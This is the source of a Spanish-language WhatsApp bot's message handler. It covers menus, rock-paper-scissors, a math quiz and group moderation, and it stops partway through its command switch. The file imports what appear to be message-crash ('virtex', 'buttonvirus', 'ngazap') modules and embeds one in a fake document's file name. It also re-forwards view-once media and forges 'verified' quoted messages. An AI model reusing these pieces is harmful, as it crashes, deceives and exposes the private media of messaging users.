/**
   * Create By Carlos.
   * Contact Me on wa.me/593991398786
   * Follow https://instagram.com/c4rl0s_9e
*/

process.on('uncaughtException', console.error) //Safe Log Error
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const stalker = require("xzons-api")
const api = require("caliph-api");
const hx = require("hxz-api");
const ra = require("ra-api")
const TD = require('better-tord');
const { tiktokdlv3 } = require('@bochilteam/scraper') 
const { ngazap } = require('./media/virtex/ngazap')
const { JSDOM } = require('jsdom')
const { buttonkal } = require('./media/virtex/buttonkal')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { mediafireDl } = require('./lib/mediafire.js')
const { virtex, vipi } = require('./media//virtex/virtex')
const { buttonvirus } = require('./media/virtex/buttonvirus')
const {
    uploadByBuffer,
    uploadByUrl
} = require('telegraph-uploader')
// Lectura de database
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []
//Database


//anti virtual
		if (m.sender.startsWith('212')) return simple.updateBlockStatus(m.sender, 'block')

//mensaje ban 
async function replybutton(teks) {
                       const buttonsDefault = [{ callButton: { displayText: `Mi Owner`, url : `+593991398786` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "© BANNED BOT", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return simple.sendMessage(from, buttonMessage)
                }

module.exports = simple = async (simple, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const from = mek.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await simple.decodeJid(simple.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const botId = simple.user.id.includes(':') ? simple.user.id.split(':')[0] + '@s.whatsapp.net' : simple.user.id


//PP USER
		try {
        ppuser = await simple.profilePictureUrl(m.sender, 'image')
        } catch (err) {
        ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
        }
        ppnyauser = await getBuffer(ppuser)
//FIN
//viewOnceMessage
		if (m.isGroup && m.mtype == 'viewOnceMessage') {
			let teks = `「 *Anti ViewOnce Mensaje* 」
    
    *• Nombre* : ${pushname}
    *• User* : @${m.sender.split("@")[0]}
    *• reloj* : ${moment.tz('America/Guayaquil').format('HH:mm:ss')}
    
     *Tipo de mensaje* : ${m.mtype}`

			m.reply(teks)
			await sleep(500)
			m.copyNForward(m.chat, true, {
				readViewOnce: true
			}, {
				quoted: m
			}).catch(_ => reply('Tal vez ha sido abierto por un bot'))
		}
		
    const bufferToUrl = async (buffer) => {
        const data = await uploadByBuffer(buffer)
        return data
    }
// DISCURSO DE TIEMPO
const time = moment.tz('Amercia/Guayaquil').format('HH:mm:ss')
// FECHA
var dias = ['/01/', '/02/', '/03/', '/04/', '/05/', '/06/', '/07/', '/08/', '/09/', '/10/', '/11/', '/12/'];
var meses = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
var tgel = new Date();
var hrs = tgel.getDate();
var mdias = tgel.getMonth();
var thisHari = tgel.getDay(),
    thisDaye = meses[thisHari];
var yye = tgel.getYear();
var syear = (yye < 1000) ? yye + 1900 : yye;
const fechasm = (hrs + '' + dias[mdias] + '' + syear)
const janghar = (thisDaye)     
   	
        // Grupo
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const groupMetadata = m.isGroup ? await simple.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
        const time2 = moment().tz('America/Guayaquil').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var timebro = 'Buenas noches 🏙️'
}
        if(time2 < "19:00:00"){
        var timebro = 'Buenas noches 🌆'
}
        if(time2 < "18:00:00"){
        var timebro = 'Buenas tardes 🌇'
}
        if(time2 < "15:00:00"){
        var timebro = 'Linda Tarde 🌤️'
}
        if(time2 < "10:00:00"){
        var timebro = 'Buenos días 🌄'
}
        if(time2 < "05:00:00"){
        var timebro = 'Buen día 🌆'
}
        if(time2 < "03:00:00"){
        var timebro = 'Buenas noches 🌃'
}
		
	       //const verificado
        const replyvid = (teks) => {simple.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply":{"title": `Hola ${pushname}`,"body": global.ownername,"previewType": "PHOTO","thumbnail": thumb, "sourceUrl": global.myweb}}}, {quoted: m})}
	    const verificado = {"key": {"fromMe": false,"participant":"0@s.whatsapp.net", "remoteJid": "557598293339@g.us" }, "message": {orderMessage: {itemCount: 2022,status: 4, thumbnail: fs.readFileSync(`./verificado.jpg`) ,message: `Pedido : ${pushname}`,surface: 100, sellerJid: "0@s.whatsapp.net"}} }
	    const sticker = {"key": {"fromMe": false,"participant":"0@s.whatsapp.net", "remoteJid": "557598293339@g.us" }, "message": {orderMessage: {itemCount: 2022,status: 4, thumbnail: fs.readFileSync(`./verificado.jpg`) ,message: `Sticker by © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛`,surface: 100, sellerJid: "0@s.whatsapp.net"}} }    
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fake, thumbnail: fake,sendEphemeral: true}} }
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '00001', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': verificado}} }
		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: verificado}} }
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '2022', 'caption': `${pushname}`, 'jpegThumbnail': verificado}} }
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: verificado}} }
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': verificado}} }
        const st ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "556181496039-1625944593@g.us"  }, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fake, surface: 200, message: `「By (𝙲𝚛𝚕𝚜ꪶ͢sєrꫂ⁩)」❤️`, orderTitle: '𝙲𝚛𝚕𝚜ꪶ͢sєrꫂ⁩', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© CRLS^ ]️",
"previewType": "PHOTO",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "593991398786@s.whatsapp.net"
}}}}

	    	//group target by Carlos\\
const reply = (teks) => {
           simple.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./media/menu.jpg`),"sourceUrl": `https://instagram.com/c4rl0s_9e`}}}, { quoted: m})
        }
        
        
        const replay = (teks) => {
            simple.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": ` PRESIONA AQUÍ⭐`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./verificado.jpg`),"sourceUrl": "https://tiktok.com/@theprivmen"}}}, { quoted: m})
        }
        //Fin Reply


const sticWait = (hehe) => {
			ano = fs.readFileSync('./media/webp/wait.webp')
			simple.sendMessage(hehe, { sticker: ano, contextInfo: {
			forwardingScore:999,
            isForwarded:true, 
            mentionedJid: [m.sender],
			externalAdReply: { 
			title: "FOLLOW ME ON INSTAGRAM ", 
			mediaType: 1, 
			body: "Website Owner", 
			thumbnail: ppnyauser, 
			previewType: "FOTO",
			sourceUrl: `https://instagram.com/c4rl0s_9e`}}}, 
			{ quoted: st })
		}
		
const menufollow = (hehe) => {
			ano = fs.readFileSync('./media/webp/follow.webp')
			simple.sendMessage(hehe, { sticker: ano, contextInfo: {
			forwardingScore:999,
            isForwarded:true, 
            mentionedJid: [m.sender],
			externalAdReply: { 
			title: "FOLLOW ME ON INSTAGRAM ", 
			mediaType: 1, 
			body: "Website Owner", 
			thumbnail: menu, 
			previewType: "PHOTO",
			sourceUrl: `https://instagram.com/c4rl0s_9e`}}}, 
			{ quoted: st })
		}	


const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `simple•MD${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

                //FAKEREPLY PRODUCT
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": thumb //La imagen
},
"title": "The CLRS+", //da tu nombre 
"description": "SELF BOT", 
"currencyCode": "USD",
"priceAmount1000": "2000",
"retailerId": "© ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛",
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
 "orderMessage": {
"orderId": orid, 
"thumbnail": thumb, 
"itemCount": itcount, 
"status": "INQUIRY", 
"surface": "CATALOG", 
"orderTitle": title, 
"message": text, 
"sellerJid": sellers, 
"token": tokens, 
"totalAmount1000": ammount, 
"totalCurrencyCode": "IDR", 
}
}), { userJid: jid })
simple.sendMessage(jid, order.message, { messageId: order.key.id})
}

//fakereply img
const fakesimple = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    imageMessage: {
      mimetype: 'image/jpeg',
      caption: 'Created By simple',
      jpegThumbnail: fake,
      viewOnce: true
    }
  }
}

// FAKE TEXT IMG
const fakethumb = (teks) => {
simple.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./media/fake.jpeg')}) 
}


if (command) {
await simple.sendPresenceUpdate('paused', m.chat)
}
//fin

//Add Hit 
global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/BotMd/visits')
conteocmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/DaddyMD${moment.tz('America/Guayaquil').format('DDMMYYYY')}/visits`)
conteoscmds = `${dataa.value}`
}


//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Prosigamos ™ ❞|═══════════════════════════════════════════⬡|//	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = true
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateLocation' in setting)) setting.templateLocation = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: true,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateLocation: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Publico & privado_™ ❞|═══════════════════════════════════════════⬡|//	

        if (!simple.public) {
            if (!m.key.fromMe) return
        }

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Consola_™ ❞|═══════════════════════════════════════════⬡|//	

        if (m.message) {
            simple.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ MSG ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> En'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Reset de los límites ™ ❞|═══════════════════════════════════════════⬡|//	

        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Restablecer límite')
        }, {
            scheduled: true,
            timezone: "America/Guayaquil"
        })
        
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Biografía automática_™ ❞|═══════════════════════════════════════════⬡|//	

	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await simple.updateProfileStatus(`${simple.user.name} | Runtime : ${runtime(uptime)}\nhttps://instagram.com/c4rl0s_9e`)
		setting.status = new Date() * 1
	    }
	}
	    
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂Antilinks_™ ❞|═══════════════════════════════════════════⬡|//	

        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nSe te ha detectado el enviando un enlace de grupo, lo sentimos, serás expulsado !`)
        if (!isBotAdmins) return m.reply(`Eh, bot no administrador T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await simple.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Uh, lo siento, no sucedió el baneo, porque enviaste el enlace de este grupo.`)
        if (isAdmins) return m.reply(`Ehh lo siento, eresadministrador`)
        if (isCreator) return m.reply(`Ehh lo siento eres el dueño de mi bot`)
        simple.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Mutear chat - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Responder comandos con medios - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: simple.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, simple.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        simple.ev.emit('messages.upsert', msg)
        }
	    
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Cuestionario Matemáticas - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Cuestionario de Matemáticas  🎮\n\nRespuesta correcta \ny ¿Quieres volver a jugar? enviar ${prefix}math modo`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Respuesta incorrecta!*')
        }

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 PIEDRA PAPEL O TIJERA - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
    if (m.sender == roof.p2 && /^(acc(ept)?|aceptar|acepto|bueno?|rechazar|Noquiero|luego|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(rechazar|Noq|luego|nop|ga(k.)?bisa)/i.test(m.text)) {
	    simple.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rechaza el pvp, el pvp se cancela`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    
	    
	    		    let buttons9 = [
                        {buttonId: `piedra`, buttonText: {displayText: 'Piedra🪨' }, type: 2},
                        {buttonId: `papel`, buttonText: {displayText: 'Papel🧻' }, type: 2},
                        {buttonId: `tijera`, buttonText: {displayText: 'Tijera✂️' }, type: 2}
                    ]
                    
                    
	    simple.sendText(m.chat, `El desafío fue enviado a sus respectivos números 
@${roof.p.split`@`[0]} y 
@${roof.p2.split`@`[0]}
por favor entren a al chat mediante este link y escojan sabiamente"
Click aquí https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })


	    //if (!roof.pilih) simple.sendText(roof.p, `Por favor seleccione \n\nPiedra🗿\nPapel📄\nTijeras✂️`, buttons, m)
	    
	    
	    if (!roof.pilih) simple.sendButtonText(roof.p, buttons9, `Okey, Seleciona \n\nPiedra🗿\nPapel📄\nTijera✂`, `${footer}`, m)
	    
	    
	    //if (!roof.pilih2) simple.sendText(roof.p2, `ᴘʟᴇᴀꜱᴇ ꜱᴇʟᴇᴄᴛ \n\nʀᴏᴄᴋ🗿\nᴘᴀᴘᴇʀ📄\nꜱᴄɪꜱꜱᴏʀꜱ✂️`, buttons, m)
	    
	    
	    if (!roof.pilih2) simple.sendButtonText(roof.p2, buttons9, `Okey, Seleciona \n\nPiedra🗿\nPapel📄\nTijera✂`, `${footer}`, m)
	    
	    
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) simple.sendText(m.chat, `buff, los usuarios no tienen la intención de jugar,\nse canceló el desafío`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    simple.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} no elijas nada, fin del juego`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /tijera/i
	    let b = /piedra/i
	    let k = /papel/i
	    let reg = /^(tijera|piedra|papel)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Has elegido ${m.text} ${!roof.pilih2 ? `\n\nEsperando a que el oponente elija` : ''}`)
	    if (!roof.pilih2) simple.sendText(roof.p2, '_Tu oponente ha elegido_\nAhora es tu turno', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Has elegido ${m.text} ${!roof.pilih ? `\n\nEsperando a que el oponente elija` : ''}`)
	    if (!roof.pilih) simple.sendText(roof.p, '_Tu oponente ha elegido_\nAhora es tu turno', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    simple.sendText(roof.asal, `_*Resultados del Desafío*_${tie ? '\nSERIE' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Ganó \n` : ` Perdió \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Ganó \n` : ` Perdió \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Afks - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
no lo etiquetes!
Él está AFK ${reason ? 'Razón ' + reason : 'No contiene una razón'}
Durante ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`
dejas de estar afk AFK${user.afkReason ? ' después ' + user.afkReason : ''}
estuviste afk Durante ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 CASES - Bot_™ ❞|═══════════════════════════════════════════⬡|//	
	    
        switch(command) {
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Ya eres afk ${text ? ': ' + text : ''}`)
            }
            break	
            case 'suitpvp': case 'suit': {
                         if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) //
		            db.data.users[m.sender].limit -= 1 // -1 limit
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let buttons8 = [
                 {buttonId: `aceptar`, buttonText: {displayText: 'Aceptar' }, type: 2},
                 {buttonId: `rechazar`, buttonText: {displayText: 'Rechazar' }, type: 2}
						   ]
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Completa tu suit anterior`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`no puedes jugar contigo mismo !`)
            if (!m.mentionedJid[0]) return m.reply(`_a quien quieres desafiar?_\nTag a la persona..\n\nEjemplo : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) m.reply(m.chat, `la persona a la que estás desafiando está jugando con otra persona:(`, m)
            let id = 'suit_' + new Date() * 1
            let caption = `_*Sala de PvP*_
@${m.sender.split`@`[0]} Desafía a @${m.mentionedJid[0].split`@`[0]} a jugar una sala
Porfavor @${m.mentionedJid[0].split`@`[0]} escribe Aceptar/Rechazar`
            this.suit[id] = {
            chat: await simple.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
	        chat: await simple.sendButtonText(m.chat, buttons8, `aceptar/rechazar`, `${footer}`, m),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) simple.sendText(m.chat, `_acabó el tiempo_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'mathpbs': case 'math': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return reply(mess.endGLimit) // respuesta cuando se agota el límite
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Todavía hay sesiones sin terminar!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Modo: ${Object.keys(modes).join(' | ')}\nEjemplos de uso: ${prefix}math medio`
                let result = await genMath(text.toLowerCase())
                simple.sendText(m.chat, `*¿Cuál es el resultado de: ${result.soal.toLowerCase()}*?\n\nHora: ${(result.waktu / 1000).toFixed(2)} segundo`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Responder: " + result.jawaban)
                    reply("Tiempo de espera acabado\nRespuesta: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Modificación de chats - Bot_™ ❞|═══════════════════════════════════════════⬡|//	

            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Opciones : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    simple.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    simple.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    simple.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
